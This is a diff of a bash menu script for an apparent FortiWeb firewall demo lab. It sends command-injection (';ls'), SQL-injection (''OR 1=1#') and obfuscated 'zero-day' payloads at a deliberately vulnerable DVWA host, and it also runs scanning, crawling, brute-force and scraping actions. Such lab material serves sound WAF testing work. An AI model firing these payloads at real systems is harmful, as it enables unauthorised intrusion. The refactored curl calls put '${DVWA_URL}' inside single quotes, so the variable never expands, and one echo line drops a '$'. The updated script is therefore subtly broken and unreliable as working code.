@@ -1,6 +1,16 @@
-# bbuonassera May 4th, 2023
+# bbuonassera May 14, 2023
 # menu from github.com/barbw1re/bash-menu
+# bot from github.com/FortinetSecDevOps/FortiWeb-Advanced-Threat-Lab
 #!/bin/bash
+
+###############################################
+## URL used in this script
+###############################################
+DVWA_URL="https://dvwa.corp.fabriclab.ca"
+DVWA_HOST="dvwa.corp.fabriclab.ca"
+SHOP_URL="https://shop.corp.fabriclab.ca"
+FWB_URL="https://fwb.corp.fabriclab.ca"
+KALI_URL="https://flbr1kali01.fortiweb.fabriclab.ca"
 
 ###############################################
 ## Ensure we are running under bash
@@ -70,7 +80,7 @@ initAll() {
   FORMID="form_id"
   SUBMIT="submit"
   CONTENTTYPE="application/x-www-form-urlencoded"
-  URL="http://dvwa.corp.fabriclab.ca/fwb/index.html"
+  URL="${DVWA_URL}/fwb/index.html"
   USERAGENT="ML-Request-generator"
   REQUESTTIMEOUT=3
 }
@@ -177,8 +187,8 @@ firerequest-ExploitZeroDayCMDi() {
    do
      FIRSTNAME_LENGTH=`shuf -i 4-12 -n 1`
      FIRSTNAMEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $FIRSTNAME_LENGTH | head -n 1)
-     ####### ZERO DAY HERE #######
-     LASTNAMEVALUE='C;~/r.sh-%20c;~/r.sh'
+     ####### Zero-Day HERE #######
+     LASTNAMEVALUE='/%3F%3F%3F/1%3F - /???/1?'
      ADDRESS_LENGTH=`shuf -i 8-22 -n 1`
      ADDRESSVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $ADDRESS_LENGTH | head -n 1)
      ADDRESSNUMBER_LENGTH=`shuf -i 1-5 -n 1`
@@ -215,7 +225,7 @@ firerequest-ExploitZeroDaySQLi() {
      ADDRESSVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $ADDRESS_LENGTH | head -n 1)
      ADDRESSNUMBER_LENGTH=`shuf -i 1-5 -n 1`
      ADDRESSNUMBERVALUE=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $ADDRESSNUMBER_LENGTH | head -n 1)
-     ####### ZERO DAY HERE #######
+     ####### Zero-Day HERE #######
      CITYVALUE="A%20'DIV'%20B%20-%20A%20'DIV%20B"
      STATE_LENGTH=`shuf -i 6-14 -n 1`
      STATEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $STATE_LENGTH | head -n 1)
@@ -306,37 +316,36 @@ LIGHTGRAY='\033[00;37m'
 Vulnerability_Scanner() {
     echo ""
     rm -Rf /var/www/html/report/report
-    skipfish -u -k 0:0:30 -o /var/www/html/report/report http://dvwa.corp.fabriclab.ca
+    skipfish -u -k 0:0:30 -o /var/www/html/report/report ${DVWA_URL}
     #rm -Rf ~/report
-    #skipfish -u -k 0:0:30 -o ~/report http://dvwa.corp.fabriclab.ca
-    echo -e "${RED}Scan Report available at https://flbr1kali01.fortiweb.fabriclab.ca${RESTORE}"
+    echo -e "${RED}Scan Report available at ${KALI_URL}{RESTORE}"
     echo ""
     echo -n "Check the Attack Logs. Press enter to continue... "
     read response
     return 1
 }
 
-Exploit_CMDi_Attack() {
+Command_Injection() {
     echo -e "\nCommand Injection Attack\n"
-    echo -e "Connecting to ${BLUE}https://dvwa.corp.fabriclab.ca/login.php${RESTORE} username=${BLUE}pablo${RESTORE} password=${BLUE}letmein${RESTORE}\n"
-    curl 'https://dvwa.corp.fabriclab.ca/login.php' \
+    echo -e "Connecting to ${BLUE}${DVWA_URL}/login.php${RESTORE} username=${BLUE}pablo${RESTORE} password=${BLUE}letmein${RESTORE}\n"
+    curl '${DVWA_URL}/login.php' \
         -H 'authority: dvwa.corp.fabriclab.ca' \
         -H 'cache-control: max-age=0' \
         -H 'content-type: application/x-www-form-urlencoded' \
-        -H 'origin: https://dvwa.corp.fabriclab.ca' \
-        -H 'referer: https://dvwa.corp.fabriclab.ca/' \
+        -H 'origin: ${DVWA_URL}' \
+        -H 'referer: ${DVWA_URL}/' \
         -H 'user-agent: FortiWeb Demo Script' \
         --insecure \
         --data-raw 'username=pablo&password=letmein&Login=Login' \
         -c cookie.txt
 
-    echo -e "Connecting to ${BLUE}https://dvwa.corp.fabriclab.ca/vulnerabilities/exec/${RESTORE} submit=${RED}\";ls\"\n"
-    curl -s 'https://dvwa.corp.fabriclab.ca/vulnerabilities/exec/' \
+    echo -e "Connecting to ${BLUE}${DVWA_URL}/vulnerabilities/exec/${RESTORE} submit=${RED}\";ls\"\n"
+    curl -s '${DVWA_URL}/vulnerabilities/exec/' \
         -H 'authority: dvwa.corp.fabriclab.ca' \
         -H 'cache-control: max-age=0' \
         -H 'content-type: application/x-www-form-urlencoded' \
-        -H 'origin: https://dvwa.corp.fabriclab.ca' \
-        -H 'referer: https://dvwa.corp.fabriclab.ca/index.php' \
+        -H 'origin: ${DVWA_URL}' \
+        -H 'referer: ${DVWA_URL}/index.php' \
         -H 'user-agent: FortiWeb Demo Script' \
         --insecure \
         --data-raw 'ip=;ls&Submit=Submit' \
@@ -347,27 +356,27 @@ Exploit_CMDi_Attack() {
     return 1
 }
 
-Exploit_SQLi_Attack() {
+SQL_Injection() {
     echo -e "\nSQL Injection Attack\n"
-    echo -e "Connecting to ${BLUE}https://dvwa.corp.fabriclab.ca/login.php${RESTORE} username=${BLUE}gordonb${RESTORE} password=${BLUE}abc123${RESTORE}\n"
-    curl 'https://dvwa.corp.fabriclab.ca/login.php' \
+    echo -e "Connecting to ${BLUE}${DVWA_URL}/login.php${RESTORE} username=${BLUE}gordonb${RESTORE} password=${BLUE}abc123${RESTORE}\n"
+    curl '${DVWA_URL}/login.php' \
         -H 'authority: dvwa.corp.fabriclab.ca' \
         -H 'cache-control: max-age=0' \
         -H 'content-type: application/x-www-form-urlencoded' \
-        -H 'origin: https://dvwa.corp.fabriclab.ca' \
-        -H 'referer: https://dvwa.corp.fabriclab.ca/' \
+        -H 'origin: ${DVWA_URL}' \
+        -H 'referer: ${DVWA_URL}/' \
         -H 'user-agent: FortiWeb Demo Script' \
         --insecure \
         --data-raw 'username=gordonb&password=abc123&Login=Login' \
         -c cookie.txt
 
-    echo -e "Connecting to ${BLUE}https://dvwa.corp.fabriclab.ca/vulnerabilities/sqli/${RESTORE} id=${RED}\"'OR 1=1#\"\n"
-    curl -s 'https://dvwa.corp.fabriclab.ca/vulnerabilities/sqli/?id=%27OR+1%3D1%23&Submit=Submit' \
+    echo -e "Connecting to ${BLUE}${DVWA_URL}/vulnerabilities/sqli/${RESTORE} id=${RED}\"'OR 1=1#\"\n"
+    curl -s '${DVWA_URL}/vulnerabilities/sqli/?id=%27OR+1%3D1%23&Submit=Submit' \
         -H 'authority: dvwa.corp.fabriclab.ca' \
         -H 'cache-control: max-age=0' \
         -H 'content-type: application/x-www-form-urlencoded' \
-        -H 'origin: https://dvwa.corp.fabriclab.ca' \
-        -H 'referer: https://dvwa.corp.fabriclab.ca/index.php' \
+        -H 'origin: ${DVWA_URL}' \
+        -H 'referer: ${DVWA_URL}/index.php' \
         -H 'user-agent: FortiWeb Demo Script' \
         --insecure \
         -b cookie.txt | grep -oP '(?<=<h3>).*?(?=</h3>)'
@@ -379,13 +388,13 @@ Exploit_SQLi_Attack() {
 
 Cookie_Security() {
     echo -e "\nCookie Security\n"
-    echo -e "Connecting to ${BLUE}https://dvwa.corp.fabriclab.ca/login.php${RESTORE} username=${BLUE}smithy${RESTORE} password=${BLUE}password${RESTORE}\n"
-    curl 'https://dvwa.corp.fabriclab.ca/login.php' \
+    echo -e "Connecting to ${BLUE}${DVWA_URL}/login.php${RESTORE} username=${BLUE}smithy${RESTORE} password=${BLUE}password${RESTORE}\n"
+    curl '${DVWA_URL}/login.php' \
         -H 'authority: dvwa.corp.fabriclab.ca' \
         -H 'cache-control: max-age=0' \
         -H 'content-type: application/x-www-form-urlencoded' \
-        -H 'origin: https://dvwa.corp.fabriclab.ca' \
-        -H 'referer: https://dvwa.corp.fabriclab.ca/' \
+        -H 'origin: ${DVWA_URL}' \
+        -H 'referer: ${DVWA_URL}/' \
         -H 'user-agent: FortiWeb Demo Script' \
         --insecure \
         --data-raw 'username=smithy&password=password&Login=Login' \
@@ -400,26 +409,18 @@ Cookie_Security() {
     echo -e "\nNow that we've changed the security level, let's connect again to the server. Press enter to continue... "
     read response
 
-    echo -e "Connecting to ${BLUE}https://dvwa.corp.fabriclab.ca/security.php\n${RED}"
-    curl -s 'https://dvwa.corp.fabriclab.ca/security.php' \
+    echo -e "Connecting to ${BLUE}${DVWA_URL}/security.php\n${RED}"
+    curl -s '${DVWA_URL}/security.php' \
         -H 'authority: dvwa.corp.fabriclab.ca' \
         -H 'cache-control: max-age=0' \
         -H 'content-type: application/x-www-form-urlencoded' \
-        -H 'origin: https://dvwa.corp.fabriclab.ca' \
-        -H 'referer: https://dvwa.corp.fabriclab.ca/index.php' \
+        -H 'origin: ${DVWA_URL}' \
+        -H 'referer: ${DVWA_URL}/index.php' \
         -H 'user-agent: FortiWeb Demo Script' \
         --insecure \
         -b cookie.txt 
 
     echo -en "${YELLOW}Check the Attack Logs${RESTORE}. Press enter to continue... "
-    read response
-    return 1
-}
-
-Web_Crawler() {
-    echo "Web Crawler Started"
-    httrack dvwa.corp.fabriclab.ca -O ./dvwa --testlinks -%v -F "wotbox"
-    echo -en "\n\n${YELLOW}Check the Attack Logs${RESTORE}. Press enter to continue... "
     read response
     return 1
 }
@@ -481,7 +482,7 @@ ML_Exploit_SQLi() {
 ML_Exploit_ZeroDay_CMDi() {
     COUNT=1
     METHOD="POST"
-    echo -e "\nSending Zero Day Command Injection\n"
+    echo -e "\nSending Zero-Day Command Injection\n"
     firerequest-ExploitZeroDayCMDi
     echo -en "${YELLOW}Check the Attack Logs${RESTORE}. Press enter to continue... "
     read response
@@ -491,7 +492,7 @@ ML_Exploit_ZeroDay_CMDi() {
 ML_Exploit_ZeroDay_SQLi() {
     COUNT=1
     METHOD="POST"
-    echo -e "\nSending Zero Day SQL Injection\n"
+    echo -e "\nSending Zero-Day SQL Injection\n"
     firerequest-ExploitZeroDaySQLi
     echo -en "${YELLOW}Check the Attack Logs${RESTORE}. Press enter to continue... "
     read response
@@ -502,12 +503,12 @@ ML_Custom_Request() {
     COUNTER=0    
     echo ""
     read -p $'Amount of requests (\e[0;35m1\e[m): ' COUNT
-    read -p $'URL (\e[0;35mhttp://fwb.corp.fabriclab.ca/fwb/index.html\e[m): ' URL
+    read -p $'URL (\e[0;35m${FWB_URL}/fwb/index.html\e[m): ' URL
     read -p $'Method (GET, \e[0;35mPOST\e[m, PUT, DELETE, OPTIONS, HEAD): ' METHODIN
     read -p $'Parameter name (\e[0;35mfirstname\e[m, lastname, address, city, state, postal, country): ' PARAMETER
     read -p $'Data type (date-short, date-long, postal, email, phone, \e[0;35mrandom\e[m, number-small, number-big): ' PARAMETERTYPE
 
-    [ -z $URL ] && URL="http://fwb.corp.fabriclab.ca/fwb/index.html"
+    [ -z $URL ] && URL="${FWB_URL}/fwb/index.html"
     [ -z $COUNT ] && COUNT=1
     [ -z $METHODIN ] && METHODIN="POST"
     [ -z $PARAMETER ] && PARAMETER="firstname"
@@ -631,6 +632,27 @@ API_Reset_ML() {
     return 1
 }
 
+
+############################################################################
+## Bot Actions
+############################################################################
+
+BOT_Web_Crawler() {
+    echo "Web Crawler Started"
+    httrack ${DVWA_HOST} -O ./dvwa_dump --testlinks -%v -F "wotbox"
+    echo -en "\n\n${YELLOW}Check the Attack Logs${RESTORE}. Press enter to continue... "
+    read response
+    return 1
+}
+
+BOT_Web_Scraper() {
+    echo "Web Scraper Started"
+    python3 scrape_products.py
+    echo -en "\n\n${YELLOW}Check the Attack Logs${RESTORE}. Press enter to continue... "
+    read response
+    return 1
+}
+
 ############################################################################
 ## Exit Program
 ############################################################################
@@ -645,51 +667,45 @@ Exit() {
 ################################
 
 ## Menu Item Text
-##
-## It makes sense to have "Exit" as the last item,
-## as pressing Esc will jump to last item (and
-## pressing Esc while on last item will perform the
-## associated action).
-
 menuItems=(
     "A. Vulnerability Scanner"
     "B. Command Injection"
     "C. SQL Injection"
     "D. Cookie Security"
-    "E. Web Crawler with Wotbox"
-    "F. Brute Force Attack"
-    "G. Custom Request"
-    "H. ML - 3000 POST requests - normal field input (learn)"
-    "I. ML - 3000 POST requests - random field input (relearn)"
-    "J. ML - Cross-site scripting"
-    "K. ML - SQL Injection"
-    "L. ML - Zero-Day Command Injection"
-    "M. ML - Zero-Day SQL Injection"
-    "N. REST API - Create POLICY1 & POLICY2"
-    "O. REST API - Delete POLICY1 & POLICY2"
-    "P. REST API - Reset Machine Learning"
-    "Q. Exit  "
+    "E. Brute Force Attack"
+    "F. ML - 3000 POST requests - normal field input (learn)"
+    "G. ML - 3000 POST requests - random field input (relearn)"
+    "H. ML - Cross-site scripting"
+    "I. ML - SQL Injection"
+    "J. ML - Zero-Day Command Injection"
+    "K. ML - Zero-Day SQL Injection"
+    "L. ML - Custom Request"
+    "M. REST API - Create POLICY1 & POLICY2"
+    "N. REST API - Delete POLICY1 & POLICY2"
+    "O. REST API - Reset Machine Learning"
+    "P. Bot - Web Scraper"
+    "Q. Bot - Web Crawler"
 )
 
 ## Menu Item Actions
 menuActions=(
     Vulnerability_Scanner
-    Exploit_CMDi_Attack
-    Exploit_SQLi_Attack
+    Command_Injection
+    SQL_Injection
     Cookie_Security
-    Web_Crawler
     Brute_Force_Attack
-    ML_Custom_Request
     ML_Learn_Parameters
     ML_Relearn_Parameters
     ML_Exploit_XSS
     ML_Exploit_SQLi
     ML_Exploit_ZeroDay_CMDi
     ML_Exploit_ZeroDay_SQLi
+    ML_Custom_Request
     API_Create_Policy
     API_Delete_Policy
     API_Reset_ML
-    Exit
+    BOT_Web_Crawler
+    BOT_Web_Scraper
 )
 
 ################################
